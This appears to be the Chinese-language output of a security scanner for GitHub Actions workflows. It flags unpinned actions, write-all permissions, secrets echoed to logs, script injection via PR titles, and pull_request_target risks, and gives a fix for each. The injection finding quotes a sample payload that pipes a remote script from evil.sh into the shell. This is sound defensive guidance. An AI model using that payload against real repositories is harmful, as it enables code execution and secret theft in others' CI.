Action 未锁定版本（用 @main / @master）
GitHub Docs — Security hardening for GitHub Actions: pinning to a full-length commit SHA
 .github/workflows/bad.yml:10
uses: actions/checkout@main
 用 @main/@master 意味着 action 作者推送任何代码都会立刻在你的 CI 里执行 —— 上游被投毒时你就是受害者。改成完整 commit SHA（如 actions/checkout@8f4b7f8...），而不是 tag 或分支。
高
workflow 权限设为 write-all
GitHub Docs — Assigning permissions to jobs：最小权限原则
 .github/workflows/bad.yml:4
permissions: write-all
 write-all 让该 workflow 里任何一步（含第三方 action）都能改仓库内容、发 release、改 settings。改成按需声明，例如 permissions: { contents: read }。
高
在 run 里直接输出 secrets
GitHub Docs — Security hardening for GitHub Actions: 永远不要把 secrets 打印到日志
 .github/workflows/bad.yml:20
echo "token=${{ secrets.
 echo "${{ secrets.X }}" 会把密钥写进构建日志 —— 日志可被有读权限的人看到、会被缓存、会进下载的日志包。改成写进环境变量并避免打印，或用 ::add-mask:: 主动打码。
高
run 里直接插值外部可控输入（脚本注入）
GitHub Security Lab《Script injections in GitHub Actions》—— 攻击者可通过 PR 标题/分支名注入 shell 命令
 .github/workflows/bad.yml:15
run: | echo "PR title: ${{ github.event.pull_request
 ${{ github.event.pull_request.title }} 这类值由外部贡献者可控。直接插进 run 里，等于让陌生人往你的 shell 里写字（比如标题里放 "; curl evil.sh|sh; "）。改成先写进 env: 再引用 $VAR。

使用 pull_request_target 触发
GitHub Docs — Events that trigger workflows: pull_request_target；GitHub Security Lab《Preventing pwn requests》
 .github/workflows/bad.yml:3
pull_request_target
 pull_request_target 在目标仓库上下文运行，能拿到 secrets，且默认有写权限。若后续 checkout 了 PR 的代码（ref: github.event.pull_request.head.sha）并执行其中的脚本，外部贡献者可直接窃取 secrets。若只是打标签/评论、不 checkout PR 代码，则风险可控 —— 请人工确认。
